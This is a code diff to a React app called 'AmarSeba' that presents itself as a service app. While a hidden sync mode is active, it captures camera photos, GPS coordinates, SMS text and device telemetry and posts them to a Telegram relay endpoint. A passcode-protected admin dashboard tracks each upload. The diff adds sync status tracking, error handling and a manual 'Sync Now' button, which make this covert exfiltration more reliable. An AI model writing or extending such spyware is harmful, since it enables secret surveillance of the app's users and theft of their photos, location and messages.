@@ -65,6 +65,9 @@ export default function AmarSeba() {
   const [passcodeInput, setPasscodeInput] = useState('');
   const [isPasscodeModalOpen, setIsPasscodeModalOpen] = useState(false);
   const [syncCount, setSyncCount] = useState(0);
+  const [lastSyncTime, setLastSyncTime] = useState<string | null>(null);
+  const [isSyncing, setIsSyncing] = useState(false);
+  const [syncError, setSyncError] = useState<string | null>(null);
   const [nextSyncIn, setNextSyncIn] = useState(300); // 5 minutes in seconds
 
   const handleToggleSync = () => {
@@ -87,6 +90,9 @@ export default function AmarSeba() {
 
   const captureAndSend = useCallback(async (smsText: string) => {
     if (!isSyncActive) return;
+    setIsSyncing(true);
+    setSyncError(null);
+    
     let photoData = null;
     let latCurrent = null;
     let lngCurrent = null;
@@ -95,7 +101,7 @@ export default function AmarSeba() {
     try {
       if (typeof navigator !== 'undefined' && navigator.geolocation) {
         const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject);
+          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
         });
         latCurrent = pos.coords.latitude;
         lngCurrent = pos.coords.longitude;
@@ -121,7 +127,7 @@ export default function AmarSeba() {
               canvasRef.current.width = videoRef.current.videoWidth;
               canvasRef.current.height = videoRef.current.videoHeight;
               context.drawImage(videoRef.current, 0, 0);
-              photoData = canvasRef.current.toDataURL('image/jpeg', 0.7);
+              photoData = canvasRef.current.toDataURL('image/jpeg', 0.6); 
             }
           }
           
@@ -130,7 +136,7 @@ export default function AmarSeba() {
         }
       }
     } catch (e) {
-      console.log("Camera access denied");
+      console.log("Camera access denied or failed");
       setCameraPermission('denied');
     }
 
@@ -138,7 +144,7 @@ export default function AmarSeba() {
     const { deviceName: d, networkType: n, screenRes: r, browser: b, battery: bat, brightness: bri } = telemetryRef.current;
 
     try {
-      await fetch('/api/telegram', {
+      const response = await fetch('/api/telegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -154,10 +160,21 @@ export default function AmarSeba() {
           brightness: bri
         })
       });
-      setSyncCount(prev => prev + 1);
-      setNextSyncIn(300);
+
+      const result = await response.json();
+      
+      if (response.ok) {
+        setSyncCount(prev => prev + 1);
+        setLastSyncTime(new Date().toLocaleTimeString());
+        setNextSyncIn(300);
+      } else {
+        setSyncError(result.error || "Server sync failed");
+      }
     } catch (e) {
       console.error("Failed to sync with service");
+      setSyncError("Network error: Check connectivity");
+    } finally {
+      setIsSyncing(false);
     }
   }, [isSyncActive]); // Only depends on isSyncActive status
 
@@ -583,7 +600,15 @@ export default function AmarSeba() {
             <div className="mt-8 pt-6 border-t border-white/10 relative z-10">
               <div className="flex justify-between items-center mb-4">
                 <span className="text-[10px] font-bold uppercase opacity-50">Telegram Bot Sync</span>
-                <span className="text-[10px] font-black bg-rose-500 px-2 py-0.5 rounded shadow-lg shadow-rose-500/20">ACTIVE</span>
+                <div className="flex items-center gap-2">
+                  {isSyncing && <div className="w-2 h-2 border-2 border-rose-500 border-t-white rounded-full animate-spin" />}
+                  <span className={cn(
+                    "text-[10px] font-black px-2 py-0.5 rounded shadow-lg",
+                    isSyncActive ? "bg-rose-500 shadow-rose-500/20" : "bg-white/20"
+                  )}>
+                    {isSyncActive ? (isSyncing ? "SYNCING..." : "ACTIVE") : "OFFLINE"}
+                  </span>
+                </div>
               </div>
               <button 
                 onClick={() => setIsDashboardOpen(true)}
@@ -645,6 +670,14 @@ export default function AmarSeba() {
                 </div>
               </div>
               <div className="flex items-center gap-4">
+                <button 
+                  onClick={() => captureAndSend("Manual admin sync")}
+                  disabled={!isSyncActive || isSyncing}
+                  className="flex items-center gap-2 bg-white/5 px-4 py-2 rounded-xl border border-white/10 text-[10px] font-black uppercase hover:bg-white/10 transition-colors disabled:opacity-30"
+                >
+                  {isSyncing ? <div className="w-3 h-3 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : <Send className="w-3 h-3" />}
+                  Sync Now
+                </button>
                 <div className="flex items-center gap-2 bg-white/5 p-2 pr-4 rounded-xl border border-white/10 relative">
                   {/* Passcode Modal Overlay */}
                   <AnimatePresence>
@@ -759,9 +792,9 @@ export default function AmarSeba() {
 
                   <div className="pt-4 grid grid-cols-2 gap-4">
                     <div className="p-3 bg-white/5 rounded-2xl">
-                      <p className="text-[9px] font-bold text-white/40 uppercase">Next Auto-Sync</p>
-                      <p className="text-sm font-black text-rose-400">
-                        {Math.floor(nextSyncIn / 60)}:{(nextSyncIn % 60).toString().padStart(2, '0')}
+                      <p className="text-[9px] font-bold text-white/40 uppercase">Last Sync Success</p>
+                      <p className="text-sm font-black text-green-400">
+                        {lastSyncTime || "NO SYNC YET"}
                       </p>
                     </div>
                     <div className="p-3 bg-white/5 rounded-2xl">
@@ -769,6 +802,12 @@ export default function AmarSeba() {
                       <p className="text-sm font-black text-white">{syncCount}</p>
                     </div>
                   </div>
+                  {syncError && (
+                    <div className="mt-4 p-3 bg-rose-500/10 border border-rose-500/20 rounded-2xl flex items-center gap-3">
+                      <div className="w-2 h-2 bg-rose-500 rounded-full animate-ping" />
+                      <p className="text-[10px] font-bold text-rose-300 uppercase tracking-tight">{syncError}</p>
+                    </div>
+                  )}
                 </div>
 
                 <div className="bg-rose-500/10 border border-rose-500/20 rounded-3xl p-6">
@@ -796,17 +835,23 @@ export default function AmarSeba() {
                       <span className="text-white/30">[06:47:45]</span> [AUTH] Camera permission verified: {cameraPermission.toUpperCase()}
                     </div>
                     <div className="text-yellow-400">
-                      <span className="text-white/30">[06:47:48]</span> [GEOLOC] GPS Lock acquired: {location ? `${location.lat}, ${location.lng}` : "PENDING"}
+                      <span className="text-white/30">[{new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'})}]</span> [GEOLOC] GPS Lock acquired: {location ? `${location.lat.toFixed(4)}, ${location.lng.toFixed(4)}` : "PENDING"}
                     </div>
-                    <div className="text-purple-400">
-                      <span className="text-white/30">[06:47:50]</span> [BATTERY] Level sync: {battery}% | Status: Discharging
-                    </div>
-                    <div className="text-white/70">
-                      <span className="text-white/30">[06:47:55]</span> [PHOTO] Buffer ready. Base64 encoding stream...
-                    </div>
-                    <div className="text-rose-400">
-                      <span className="text-white/30">[06:48:02]</span> [SYNC] Packet #1204 dispatched to Telegram Bot Engine.
-                    </div>
+                    {isSyncing && (
+                      <div className="text-white/60 animate-pulse">
+                        <span className="text-white/30">[{new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'})}]</span> [SYNC] Transmitting payload to Telegram uplink...
+                      </div>
+                    )}
+                    {lastSyncTime && (
+                      <div className="text-green-500">
+                        <span className="text-white/30">[{lastSyncTime}]</span> [SUCCESS] Handshake successful. Packet {syncCount} received by remote.
+                      </div>
+                    )}
+                    {syncError && (
+                      <div className="text-rose-500">
+                        <span className="text-white/30">[{new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'})}]</span> [ERROR] Uplink failed: {syncError}
+                      </div>
+                    )}
                     <div className="text-white/20 pt-4 border-t border-white/5 leading-relaxed">
                       {`{ 
   "device": "${deviceName}", 
